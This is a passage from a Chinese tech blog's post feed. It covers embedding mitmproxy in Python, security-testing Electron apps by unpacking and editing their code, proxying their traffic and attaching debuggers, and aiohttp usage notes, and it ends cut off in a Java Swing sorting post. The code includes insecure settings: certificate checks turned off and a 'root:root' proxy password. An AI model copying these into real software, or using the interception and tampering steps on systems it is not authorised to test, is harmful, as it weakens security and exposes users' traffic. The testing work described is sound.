mitmproxy.tools.main <span class="hljs-keyword">import</span> mitmdump<br>mitmdump(args=<span class="hljs-string">&quot;--listen-port=6666 -m upstream:127.0.0.1:8080 --proxyauth=root:root&quot;</span>.split(<span class="hljs-string">&quot; &quot;</span>))<br></code></pre></div></td></tr></table></figure><p>来启动代理，args参数跟调用<code>mitmdump</code>命令时传的参数一样。因为起初在网上搜，搜到的是另一段代码，所以没用这种简洁的方式，用的是：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, freeze_support, Queue<br><br><span class="hljs-keyword">from</span> mitmproxy <span class="hljs-keyword">import</span> proxy, options<br><span class="hljs-keyword">from</span> mitmproxy.http <span class="hljs-keyword">import</span> HTTPFlow<br><span class="hljs-keyword">from</span> mitmproxy.tools.dump <span class="hljs-keyword">import</span> DumpMaster<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Handler</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将请求加入队列</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, req_queue: Queue</span>):<br>        self.req_queue = req_queue<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, flow: HTTPFlow</span>):<br>        request_dict = &#123;<br>            <span class="hljs-string">&quot;method&quot;</span>: flow.request.method,<br>            <span class="hljs-string">&quot;url&quot;</span>: flow.request.url,<br>            <span class="hljs-string">&quot;headers&quot;</span>: [(key, flow.request.headers[key]) <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> flow.request.headers],<br>            <span class="hljs-string">&quot;cookies&quot;</span>: [(key, flow.request.cookies[key]) <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> flow.request.cookies],<br>            <span class="hljs-string">&quot;data&quot;</span>: flow.request.text<br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(request_dict.get(<span class="hljs-string">&quot;url&quot;</span>))<br>            self.req_queue.put(request_dict, timeout=<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">except</span> queue.Full:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">response</span>(<span class="hljs-params">self, flow: HTTPFlow</span>):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">responseheaders</span>(<span class="hljs-params">self, flow: HTTPFlow</span>):<br>       <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_start_proxy</span>(<span class="hljs-params">req_queue</span>):<br>    opts = options.Options(listen_host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>, listen_port=<span class="hljs-number">6666</span>)<br><br>    m = DumpMaster(opts, with_termlog=<span class="hljs-literal">False</span>, with_dumper=<span class="hljs-literal">False</span>)<br><br>    pconf = proxy.config.ProxyConfig(opts)<br>    m.server = proxy.server.ProxyServer(pconf)<br>    m.addons.add(Handler(req_queue))<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Proxy server listening at http://127.0.0.1:6666&quot;</span>)<br>    m.run()<br>    <span class="hljs-comment"># m.shutdown()</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_proxy</span>(<span class="hljs-params">req_queue</span>):<br>    freeze_support()<br>    p = Process(target=do_start_proxy, args=(req_queue, ))<br>    p.start()<br>    <span class="hljs-keyword">return</span> p<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    req_queue = Queue(<span class="hljs-number">6000</span>)<br>    p = start_proxy(req_queue)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 从req_queue获取请求，进行处理</span><br>            time.sleep(<span class="hljs-number">300</span>)<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        p.terminate()<br>        p.join()<br><br></code></pre></div></td></tr></table></figure><p>下文将以这种方式来说明</p><h4 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h4><p>上面使用子进程启动mitmproxy，然后通过<code>m.addons.add(Handler(req_queue))</code>注册插件，该插件将收到的请求信息添加到队列中，以便后续使用。</p><p><code>Handler</code>类就是插件。其<code>request</code>方法在mitmproxy接到请求后调用，<code>response</code>方法在收到响应后调用，<code>responseheaders</code>方法在收到响应头部时就调用.（更多的回调方法参考<a href="https://docs.mitmproxy.org/stable/addons-events/">这里</a>）。这些回调方法，通常接收一个flow参数，可以用来获取请求和响应信息，使用也简单，看<a href="https://mitmproxy.readthedocs.io/en/v2.0.2/scripting/api.html">这里</a>就行。</p><blockquote><p> 注意： 不要在<code>request()</code>里用到<code>flow.response</code>，否则会卡住</p></blockquote><h4 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h4><p>mitmproxy已经处理好证书了。将浏览器代理指向mitmproxy，访问<code>mitm.it</code>，下载安装证书就行</p><h4 id="option配置"><a href="#option配置" class="headerlink" title="option配置"></a>option配置</h4><p>上面那段代码中：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">opts = options.Options(listen_host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>, listen_port=<span class="hljs-number">6666</span>)<br><br>m = DumpMaster(opts, with_termlog=<span class="hljs-literal">False</span>, with_dumper=<span class="hljs-literal">False</span>)<br><br>pconf = proxy.config.ProxyConfig(opts)<br>m.server = proxy.server.ProxyServer(pconf)<br>m.addons.add(Handler(req_queue))<br></code></pre></div></td></tr></table></figure><p><code>listen_host</code>配置代理监听地址，<code>listen_port</code>配置代理监听端口。<code>with_templog</code>为True时会输出客户端连接、断开信息，如：<code>127.0.0.1:53033: clientconnect  127.0.0.1:53034: clientconnect</code>；<code>with_dumper</code>为True时，输出连接信息：请求方法、URL、状态码等。所有可配置的option，看<a href="https://docs.mitmproxy.org/stable/concepts-options/">这里</a>。</p><p>举两个其它的配置：</p><p>配置上流代理（mitmproxy的流量都传到这个proxy）：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">opts.update(mode=<span class="hljs-string">&quot;upstream:127.0.0.1:1080&quot;</span>)  <span class="hljs-comment"># 所有接收到流量都传到127.0.0.1:1080这个代理去</span><br>opts.update(ssl_insecure=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 不验证上流代理给的https证书</span><br></code></pre></div></td></tr></table></figure><p>配置代理的账号密码：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">opts.update(proxyauth=<span class="hljs-string">&quot;root:root&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>这句代码要在初始化<code>DumpMaster</code>类后再调用。因为这个配置选项是由内置插件<code>ProxyAuth</code>提供的，该插件在初始化<code>DumpMaster</code>类时添加。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>感觉直接调用<code>mitmdump</code>函数简单些。一开始用的是网上给的，没看源码，不知道有这种方式。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Electron应用安全测试方法</title>
    <link href="/2020/07/12/analyse-electron-app/"/>
    <url>/2020/07/12/analyse-electron-app/</url>
    
    <content type="html"><![CDATA[<p>Electron应用的代码通常在<code>resources/</code>目录下的<code>app/</code>目录，可能被打包成<code>app.asar</code>文件（或者命名为<code>core.asar</code>）。在没有对<code>app.asar</code>包进行额外保护的情况下，可直接解压<code>app.asar</code>文件到<code>app/</code>目录。</p><h4 id="解压缩asar文件"><a href="#解压缩asar文件" class="headerlink" title="解压缩asar文件"></a>解压缩asar文件</h4><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">npm <span class="hljs-keyword">install </span>-g asar<br><br>解压： asar <span class="hljs-keyword">extract </span>asar文件  解压文件夹<br>压缩： asar pack 文件夹  asar文件<br></code></pre></div></td></tr></table></figure><p>Electron会优先加载<code>app/</code>目录，而非<code>app.asar</code>。所以解压后直接修改<code>app/</code>目录下的代码，就可以简单地添加<code>console.log</code>或<code>fs.appendFileSync</code>输出些信息了。另外，当<code>package.json</code>文件（通常在<code>resources/app/</code>目录下）里的<code>main</code>字段写的是<code>app.asar/index.js</code>时，就会优先加载<code>app.asar</code>文件，需改成<code>app/index.js</code>。</p><h4 id="设置HTTP-S-代理"><a href="#设置HTTP-S-代理" class="headerlink" title="设置HTTP(S)代理"></a>设置HTTP(S)代理</h4><p>运行程序时指定<code>--proxy-server</code>参数：<code>xxx.exe --proxy-server=127.0.0.1:8080</code> （可能无效）</p><p>或</p><p>在<code>package.json</code>文件的<code>main</code>字段指定的入口文件添加代码：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">const &#123;app&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;electron&#x27;</span>)<br>app<span class="hljs-selector-class">.commandLine</span><span class="hljs-selector-class">.appendSwitch</span>(<span class="hljs-string">&#x27;proxy-server&#x27;</span>, <span class="hljs-string">&#x27;127.0.0.1:8080&#x27;</span>)  <span class="hljs-comment">// 相当于 --proxy-server=127.0.0.1:8080</span><br></code></pre></div></td></tr></table></figure><h4 id="调试主进程"><a href="#调试主进程" class="headerlink" title="调试主进程"></a>调试主进程</h4><p>运行程序时指定<code>inpect</code>参数：<code>xxx.exe --inspect=5858</code>，让Electron在5858端口监听调试协议，或者执行<code>xxx.exe --inspect-brk=5858</code>，让程序在第一行代码上暂停执行等待调试器连接。然后打开chrome浏览器访问<code>chrome://inspect</code>进行连接、调试Electron应用。</p><p>在打开的devtools的Sources栏的Filesystem栏，点击<code>+</code>按钮导入<code>app/</code>目录下的源码，然后下断点调试。如果真能下断点调试，就很方便了。不过有时会因为代码被混淆过或其它原因，导致断不下来。</p><p>另一种方式：在代码里加上<code>debugger;</code>，加上<code>--inspect-brk</code>参数运行程序，然后用chrome连接、调试，这种方式有时也是看不到源代码，不过能单步执行、打印变量、看调用堆栈。</p><h4 id="调试渲染进程"><a href="#调试渲染进程" class="headerlink" title="调试渲染进程"></a>调试渲染进程</h4><p>通过DevTools来调试渲染进程。打开DevTools的几种方式：</p><ol><li><p>看应用的菜单栏是否已提供打开DevTools的选项</p></li><li><p>尝试按快捷键：Windows或Linux按<code>Ctrl + Shift + I</code>，MacOS按<code>Cmd + Opt + I</code></p></li><li><p>修改代码文件，找到要开Devtools的<code>BrowserWindow</code>实例，调用<code>openDevTools</code>方法：</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">let</span> win = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BrowserWindow</span>(winOptions);<br>win.<span class="hljs-property">webContents</span>.<span class="hljs-title function_">openDevTools</span>();<br></code></pre></div></td></tr></table></figure></li></ol><h4 id="查看版本号"><a href="#查看版本号" class="headerlink" title="查看版本号"></a>查看版本号</h4><p>查看应用使用的Electron的版本号：执行<code>process.versions.electron</code>查看，或抓包看<code>User-Agent</code>，Devtools里的数据包也有表明Electron版本号。</p><p>查看该Electron应用的版本号：在<code>package.json</code>文件里查看，或执行：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">electron.<span class="hljs-property">remote</span>.<span class="hljs-property">app</span>.<span class="hljs-title function_">getVersion</span>()  <span class="hljs-comment">// 渲染进程里执行</span><br>electron.<span class="hljs-property">app</span>.<span class="hljs-title function_">getVersion</span>() <span class="hljs-comment">// 主进程里执行</span><br></code></pre></div></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li>《<a href="https://blog.doyensec.com/2018/07/19/instrumenting-electron-app.html">Instrumenting Electron Apps for Security Testing</a>》，翻译版：《<a href="https://xz.aliyun.com/t/2461">测试 Electron 应用的基本指南</a>》：介绍怎么调试、抓包Electron应用。本文相当于在该文章的基础上做点补充</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>NodeJS安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python aiohttp模块使用笔记</title>
    <link href="/2020/03/10/python-aiohttp-practice-note/"/>
    <url>/2020/03/10/python-aiohttp-practice-note/</url>
    
    <content type="html"><![CDATA[<p>本文是在使用<code>aiohttp</code>模块时的一点笔记。代码在<code>Python 3.7</code>下运行。</p><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ayncio<br><span class="hljs-keyword">import</span> aiohttp<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession(<br>        headers=&#123;<span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;aiohttp&quot;</span>&#125;,<br>        timeout=aiohttp.ClientTimeout(total=<span class="hljs-number">3</span>)) <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>) <span class="hljs-keyword">as</span> resp:<br>            <span class="hljs-built_in">print</span>(resp.status)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> resp.text())<br>            <span class="hljs-comment"># body = await resp.read()  # 读取字节流</span><br>            <span class="hljs-comment"># body_json = await resp.json()  # 获取json对象，若Content-Type响应头不等于resp.json()方法的content_type参数（该参数值默认是application/json）会抛aiohttp.ContentTypeError异常，可以改为await resp.json(content_type=None)，就不会去验证该响应头了，但如果JSON解码错误也会抛异常，抛json.JSONDecodeError异常</span><br><br>asyncio.run(main())<br></code></pre></div></td></tr></table></figure><h4 id="资源释放"><a href="#资源释放" class="headerlink" title="资源释放"></a>资源释放</h4><ol><li><p>session要释放，调用<code>await session.close()</code>或使用<code>async with</code>。对于response，要调用<code>resp.close()</code>或使用<code>async with</code>。</p></li><li><p>不能在读数据（如<code>await resp.read()</code>等）之前调用<code>await resp.release()</code>，否则会阻塞在读数据操作。</p></li><li><p>若报<code>warning: Unclosed connection</code>，则检查资源是否释放。如：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">resp = <span class="hljs-keyword">await</span> session.get(url)<br><span class="hljs-comment"># await resp.read()  # 不加这句或下面一句的话就会报warning：Unclosed connection</span><br><span class="hljs-comment"># await resp.release()</span><br></code></pre></div></td></tr></table></figure></li></ol><h4 id="设置超时"><a href="#设置超时" class="headerlink" title="设置超时"></a>设置超时</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=<span class="hljs-number">3</span>))<br><span class="hljs-comment"># 或</span><br>session.get(url, timeout=aiohttp.ClientTimeout(total=<span class="hljs-number">3</span>))<br><span class="hljs-comment"># 若超时则抛asyncio.TimeoutError异常</span><br></code></pre></div></td></tr></table></figure><p>超时要自己设置，因为默认是5分钟，太长了</p><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 没有给ClientSession对象传递proxy的方式，只有在请求时设置代理</span><br><br>session.get(url, proxy=<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>)<br><span class="hljs-comment"># 代理不可用会抛aiohttp.ClientHttpProxyError异常</span><br></code></pre></div></td></tr></table></figure><p>不验证ssl证书（注意考虑流量劫持）</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=<span class="hljs-literal">False</span>))<br><span class="hljs-comment"># 或</span><br>session.get(url, ssl=<span class="hljs-literal">False</span>)<br></code></pre></div></td></tr></table></figure><h4 id="指定cookie"><a href="#指定cookie" class="headerlink" title="指定cookie"></a>指定cookie</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    cookies = &#123;<span class="hljs-string">&#x27;csrfToken&#x27;</span>: <span class="hljs-string">&quot;my_value&quot;</span>&#125;<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession(cookies=cookies) <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-built_in">print</span>(session.cookie_jar.filter_cookies(<span class="hljs-string">&quot;https://xxx.com&quot;</span>))<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">&quot;https://xxx.com&quot;</span>) <span class="hljs-keyword">as</span> rp:<br>            <span class="hljs-built_in">print</span>(rp.cookies)<br>            <span class="hljs-built_in">print</span>(session.cookie_jar.filter_cookies(<span class="hljs-string">&quot;https://xxx.com&quot;</span>))<br>            <br></code></pre></div></td></tr></table></figure><p>通过ClientSession的cookies参数指定cookies，使用该session请求任一的站点都会带上此cookie。若响应头带有<code>set-cookie: csrfToken=1010753502;Expires=...;Domain=...;path=/;</code>，session会根据该响应头更新csrfToken这个cookie值，且加上domain、expires等信息。</p><p>若不想使用该session请求任意站点都带上此Cookie，可以：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    cookies = &#123;<span class="hljs-string">&#x27;csrfToken&#x27;</span>: <span class="hljs-string">&quot;my_value&quot;</span>&#125;<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession(cookies=cookies) <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">from</span> yarl <span class="hljs-keyword">import</span> URL<br>        session.cookie_jar.update_cookies(cookies, URL(<span class="hljs-string">&quot;https://xxx.com&quot;</span>))<br><span class="hljs-comment"># 使用该session请求xxx.com站点时才携带此Cookie</span><br><br></code></pre></div></td></tr></table></figure><p>清除session里的cookies：<code>session.cookie_jar.clear()</code></p><h4 id="ValueError-too-many-file-descriptoersin-select-报错问题"><a href="#ValueError-too-many-file-descriptoersin-select-报错问题" class="headerlink" title="ValueError: too many file descriptoersin select()报错问题"></a>ValueError: too many file descriptoersin select()报错问题</h4><p>一般是并发请求数太大导致的，通常通过减少并发数解决。</p><p>我遇到的情况：并发量设置的不高，运行一段时间后报该错误。通过搜索、调试，最后看<code>aiohttp</code>文档时发现是因为请求的https站点的服务器没有正确完成ssl连接，需要指定一个叫<code>enable_cleanup_closed</code>的参数为<code>True</code>：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(enable_cleanup_closed=<span class="hljs-literal">True</span>)<br></code></pre></div></td></tr></table></figure><p>官方对<code>enable_cleanup_closed</code>参数的解释：</p><blockquote><p>Some ssl servers do not properly complete SSL shutdown process, in that case asyncio leaks SSL connections.<br>If this parameter is set to True, aiohttp additionally aborts underlining transport after 2 seconds. It is off by default.</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java Swing表格多列排序</title>
    <link href="/2019/11/29/java-swing-table-multi-column-sort/"/>
    <url>/2019/11/29/java-swing-table-multi-column-sort/</url>
    
    <content type="html"><![CDATA[<p>Java Swing JTable开启排序功能只需一个调用：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-type">JTable</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTable</span>();<br>table.setAutoCreateRowSorter(<span class="hljs-literal">true</span>);<br></code></pre></div></td></tr></table></figure><p>但这个排序功能只支持单列排序，而多列排序需要自己实现。</p><p>本文内容是使用sorter和renderer实现点击表头进行多列排序，第一次点击的列作为主排序列，后点击的列作为次排序列。建议在开始阅读本文前可以看看官方教程《<a href="https://docs.oracle.com/javase/tutorial/uiswing/components/table.html">How to Use Tables</a>》，对JTable的sorter和renderer有个概念。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><a href="https://docs.oracle.com/javase/8/docs/api/javax/swing/RowSorter.html"><code>TableRowSorter</code></a>对象已经提供了多列排序的功能：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java">TableRowSorter&lt;TableModel&gt; sorter <br>    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TableRowSorter</span>&lt;TableModel&gt;(table.getModel());<br>table.setRowSorter(sorter);<br><br>List &lt;RowSorter.SortKey&gt; sortKeys <br>    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;RowSorter.SortKey&gt;();<br>sortKeys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RowSorter</span>.SortKey(<span class="hljs-number">1</span>, SortOrder.ASCENDING));<br>sortKeys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RowSorter</span>.SortKey(<span class="hljs-number">0</span>, SortOrder.ASCENDING));<br>sorter.setSortKeys(sortKeys);  <span class="hljs-comment">// 执行排序</span><br></code></pre></div></td></tr></table></figure><p>上面是把第1列作为主排序列升序排序，把第0列作为次排序列降序排序。</p><p>表格的表头由<code>JTableHeader</code>对象维护，该对象里维护着<code>BaseTableHeaderUI</code>对象，这个对象里设置了<code>mouseInputListener</code>监听器进行监听，当点击表头后就通知该监听器调用<code>sorter.toggleSortOrder</code>方法进行排序。所以我们需要继承<code>TableRowSorter</code>类重写<code>toggleSortOrder</code>方法实现自己的排序逻辑。</p><p>另一个要考虑的就是表头的上下箭头显示，用于显示该列是升序或降序排序。</p><p><a href="https://docs.oracle.com/javase/8/docs/api/javax/swing/table/JTableHeader.html"><code>JTableHeader</code></a>对象默认使用<code>DefaultTableCellHeaderRenderer</code>对象作为表头<code>Renderer</code>，<code>Renderer</code>的<code>getTableCellRendererComponent</code>方法里设置上下箭头图标并返回用于显示表头单元格的组件，而该方法里调用的<code>getColumnSortOrder</code>方法只会返回主排序列的排序顺序，通过该方法的返回值只能显示主排序列的箭头。所以需要重写<code>DefaultTableCellHeaderRenderer</code>对象的相关方法实现让多个列显示上下箭头，再通过<code>JTable</code>的<code>getTableHeader().setDefaultRenderer(TableCellRenderer defaultRenderer)</code>方法指定我们的表头<code>Renderer</code>）</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>通过上面的分析，我们通过编写自己的sorter和renderer实现多列排序。<br>代码与相关注释（在JDK8下测试运行）：<br><code>TableSortDemo.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 